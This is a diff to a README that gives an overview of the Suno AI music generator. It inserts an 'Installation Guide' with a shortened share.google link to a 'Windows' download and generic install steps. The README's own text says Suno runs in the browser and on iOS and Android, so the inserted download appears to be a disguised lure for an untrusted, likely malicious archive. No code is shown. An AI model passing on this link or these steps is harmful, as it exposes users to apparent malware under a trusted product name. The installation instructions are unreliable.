@@ -18,6 +18,17 @@ An overview guide to **Suno AI** — a text-to-music generation platform that tu
 
 ---
 
+
+---
+
+## 📥 Installation Guide
+
+1. **[Download]([https://share.google/bFyOivOsCEGWSSn1s])** Suno AI for Windows.
+2. Extract the downloaded archive if required.
+3. Install or launch SUNO using the recommended Windows installation method.
+4. Configure the application and select your model storage location.
+5. Install the models required for your workflow.
+6. Launch the SunoAI interface and begin creating.
 ## 📌 What is Suno AI?
 
 Suno is a generative AI platform developed by Suno, Inc. that creates full, original songs from a short text or audio prompt — vocals, lyrics, instrumentation, and production all generated together. It runs in the browser and as native iOS and Android apps, and is one of the most widely used AI music generators, with a free daily-credit tier alongside paid subscription plans for higher usage and commercial rights.
